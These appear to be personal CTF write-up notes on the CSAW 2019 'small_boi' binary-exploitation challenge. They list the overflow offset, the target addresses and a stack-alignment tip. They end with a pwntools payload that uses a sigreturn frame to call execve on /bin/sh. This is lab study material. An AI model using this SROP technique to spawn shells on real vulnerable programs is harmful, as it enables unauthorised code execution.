- `checks`
  ![[csaw19_smallboi_nightmare-1.png]]
- decompile:
  ![[csaw19_smallboi_nightmare-2.png]]
  ![[csaw19_smallboi_nightmare-3.png]]
- goal: jump to `sub_40017C` to use SROP -> [[SROP]] + [[ret2win]]
- offset = 0x28
- "win" = `sub_40017C` = 0x40017C
  ![[csaw19_smallboi_nightmare-4.png]]
- but we need to jump to 0x40017d or 0x400180 to align 16-byte stack (like win + 5 to skip `push rbp`)
- bin_sh on stack:
  ![[csaw19_smallboi_nightmare-5.png]]
- payload:
  ```python
	syscall = 0x4001a4
	sigreturn = 0x40017d
	frame = SigreturnFrame()
	frame.rax = 0x3b
	frame.rdi = 0x4001ca
	frame.rsi = 0
	frame.rdx = 0
	frame.rip = syscall
	p.send(b'A' * 0x28 + p64(sigreturn) + bytes(frame))
  ```